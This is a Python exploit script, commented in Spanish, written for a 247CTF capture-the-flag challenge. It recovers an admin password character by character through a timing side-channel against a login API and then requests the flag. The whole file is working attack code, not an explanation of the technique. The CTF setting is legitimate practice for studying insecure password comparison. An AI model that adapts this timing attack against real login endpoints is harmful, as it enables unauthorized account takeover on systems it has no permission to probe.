#!/usr/bin/env python3
import requests
import time

BASE_URL = "https://a2f2134654cc41a2.247ctf.com"
HEX_CHARS = "0123456789abcdef"

def get_token():
    resp = requests.get(f"{BASE_URL}/api/get_token", timeout=10)
    data = resp.json()
    token = data["message"].split("reset to ")[1].rstrip("!")
    return token

def try_password(username, password, api_token):
    start = time.time()
    resp = requests.post(
        f"{BASE_URL}/api/login",
        data={
            "username": username,
            "password": password,
            "api": api_token
        },
        timeout=10
    )
    elapsed = time.time() - start
    return resp.json(), elapsed

def get_flag(password):
    resp = requests.post(
        f"{BASE_URL}/api/get_flag",
        data={"password": password},
        timeout=10
    )
    return resp.json()

# UN solo token, 128 requests
# 1 medición por carácter × 16 caracteres = 16 requests por posición
# 128 / 16 = 8 posiciones máximo

# Pero voy a intentar maximizar: ¿qué tal si solo hago las posiciones suficientes
# para ver un patrón, y luego pruebo combinaciones?

api_token = get_token()
known = ""
request_count = 0

# Intentar descubrir tantas posiciones como sea posible
for pos in range(32):
    if request_count + 16 > 128:
        print(f"Solo puedo descubrir {pos} posiciones con 128 requests")
        break
        
    timings = {}
    
    for char in HEX_CHARS:
        test_password = known + char + "0" * (31 - len(known))
        result, elapsed = try_password("admin", test_password, api_token)
        timings[char] = elapsed
        request_count += 1
        
        if result.get("result") == "success":
            print(test_password)
            flag_result = get_flag(test_password)
            if "flag" in str(flag_result).lower():
                print(flag_result.get("flag", flag_result))
            else:
                print(flag_result)
            exit(0)
    
    best_char = max(timings.items(), key=lambda x: x[1])[0]
    known += best_char
    print(f"Posición {pos}: {best_char} (requests: {request_count}/128)")

print(f"\nContraseña parcial: {known}")
print(f"Longitud descubierta: {len(known)}/32")
